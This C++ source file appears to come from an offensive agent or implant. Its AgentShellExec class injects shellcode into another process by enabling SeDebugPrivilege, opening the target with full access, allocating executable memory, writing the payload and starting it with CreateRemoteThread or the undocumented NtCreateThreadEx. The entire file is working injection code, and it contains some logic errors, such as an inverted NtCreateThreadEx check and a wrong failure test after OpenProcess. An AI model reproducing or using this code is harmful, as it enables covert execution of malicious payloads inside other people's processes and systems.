#include <iostream>
#include "stdafx.h"
#include "AgentShellExec.h"
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <dos.h>
#include <tlhelp32.h>
#include "AgentPrivs.h"
#include "AgentHelpers.h"

#include "AgentLog.h"

using namespace std;


bool AgentShellExec::injectShellCode(int osLevel, DWORD dwProcId, char shellCode[])
{
	/*
	ShellCode execution with injection
	into a remote process.
	*/
	// First get proper token privs
	int size = 197;
	std::string msg = std::to_string(size);
	msg = "AgentShellExec() shell code size: " + msg;
	memoryLog(0, msg);
	DWORD err = 0;
	memoryLog(0, "AgentShellExec() started shell code execution");
	if (!EnablePrivilege(L"SeDebugPrivilege"))
	{
		memoryLog(3, "AgentShellExec() Could not obtain SeDebugPrivilege for current token");
		return FALSE;
	}
	memoryLog(0, "AgentShellExec() SeDebugPrivilege for current token set");
	//open process with proper access permissions
	HANDLE hHandle = NULL;
	if (osLevel < 2)
	{
		//good for Windows XP and older
		memoryLog(0, "AgentShellExec() OpenPorcess on xp intiated");
		hHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, 0, dwProcId);
	}
	else
	{
		//good for Windows 7 and Vista (not tested on XP or older)
		memoryLog(0, "AgentShellExec() OpenPorcess on win7+ initated");
		hHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, dwProcId);
	}
	//check if OpenProcess succeeded
	if (hHandle == INVALID_HANDLE_VALUE)
	{
		memoryLog(3, "AgentShellExec() Handle failed on OpenProcess");
		return false;
	}
	memoryLog(0, "AgentShellExec() Handle succeeded on OpenProcess");
	//allocate memory for our shellcode in the desired process's address space
	LPVOID lpShellcode = NULL;
	//choose the shellcode which suits the environment
	if (osLevel >= 2)
	{
		memoryLog(0, "AgentShellExec() Attempting to VirtualAllocEx shellcode");
		lpShellcode = VirtualAllocEx(hHandle, 0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	}
	else
	{
		memoryLog(2, "AgentShellExec() VirtualAllocEx OS level unkown trying to allocate anyway");
		lpShellcode = VirtualAllocEx(hHandle, 0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	}

	//check if VirtualAllocEx succeeded
	if (lpShellcode == NULL) {
		memoryLog(3, "AgentShellExec() VirtualAllocEx in OpenProcess failed");
		CloseHandle(hHandle);
		return false;
	}

	// write the shellcode into the allocated memory space
	SIZE_T numBytesRead = 0;
	if (osLevel >= 2)
	{
		memoryLog(0, "AgentShellExec() Attempting to WriteProcessMemory of sfhellcode bytes");
		WriteProcessMemory(hHandle, lpShellcode, shellCode, size, &numBytesRead);
		std::cout << "bytes wrote" << numBytesRead << std::endl;
		std::cout << "shell code size: " << size << std::endl;
	}
	else
	{
		memoryLog(2, "AgentShellExec() WriteProcessMemory OS level unkown trying to WriteProcessMemory");
		WriteProcessMemory(hHandle, lpShellcode, shellCode, size, &numBytesRead);
		cout << "bytes wrote: " << numBytesRead << endl;
	}
	// create a thread which will execute our shellcode
	HANDLE hThread = createRemoteThread(hHandle, lpShellcode, 0);
	if (hThread == NULL) {
		memoryLog(3, "AgentShellExec() createRemoteThread returned failed");
		CloseHandle(hHandle);
		cout << GetLastError() << endl;
		return FALSE;
	}
	memoryLog(1, "AgentShellExec() Sucessfully injected shellcode!");
	return true;
}

HANDLE AgentShellExec::createRemoteThread(HANDLE hProcess, LPVOID lpRemoteThreadStart, LPVOID lpRemoteCallback)
{
	/*
	ShellCode execution with injection
	requires a remote thread.
	*/
	if (!GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx"))
	{
		memoryLog(0, "AgentShellExec() createRemoteThread (NtCreateThreadEx) successed to create thread handle");
		return NtCreateThreadEx(hProcess, lpRemoteThreadStart, lpRemoteCallback);
	}

	else
	{
		memoryLog(0, "AgentShellExec() createRemoteThread (CreateRemoteThread) successed to create thread handle");
		return CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteThreadStart, lpRemoteCallback, 0, 0);
	}

	return NULL;
}

HANDLE AgentShellExec::NtCreateThreadEx(HANDLE hProcess, LPVOID lpRemoteThreadStart, LPVOID lpRemoteCallback)
{
	typedef struct
	{
		ULONG Length;
		ULONG Unknown1;
		ULONG Unknown2;
		PULONG Unknown3;
		ULONG Unknown4;
		ULONG Unknown5;
		ULONG Unknown6;
		PULONG Unknown7;
		ULONG Unknown8;

	} UNKNOWN;

	typedef DWORD WINAPI NtCreateThreadEx_PROC(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		BOOL CreateSuspended,
		DWORD dwStackSize,
		DWORD Unknown1,
		DWORD Unknown2,
		LPVOID Unknown3
		);

	UNKNOWN Buffer;
	DWORD dw0 = 0;
	DWORD dw1 = 0;
	memset(&Buffer, 0, sizeof(UNKNOWN));

	Buffer.Length = sizeof(UNKNOWN);
	Buffer.Unknown1 = 0x10003;
	Buffer.Unknown2 = 0x8;
	Buffer.Unknown3 = &dw1;
	Buffer.Unknown4 = 0;
	Buffer.Unknown5 = 0x10004;
	Buffer.Unknown6 = 4;
	Buffer.Unknown7 = &dw0;

	NtCreateThreadEx_PROC* VistaCreateThread = (NtCreateThreadEx_PROC*)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateThreadEx");

	if (VistaCreateThread == NULL)
		return NULL;

	HANDLE hRemoteThread = NULL;
	HRESULT hRes = 0;

	if (!SUCCEEDED(hRes = VistaCreateThread(
		&hRemoteThread,
		0x1FFFFF, // all access 
		NULL,
		hProcess,
		(LPTHREAD_START_ROUTINE)lpRemoteThreadStart,
		lpRemoteCallback,
		FALSE,
		NULL,
		NULL,
		NULL,
		&Buffer
		)))
	{
		memoryLog(3, "AgentShellExec() NtCreateThreadEx failed to create thread");
		return NULL;
	}
	memoryLog(0, "AgentShellExec() NtCreateThreadEx created remote thread");
	return hRemoteThread;
}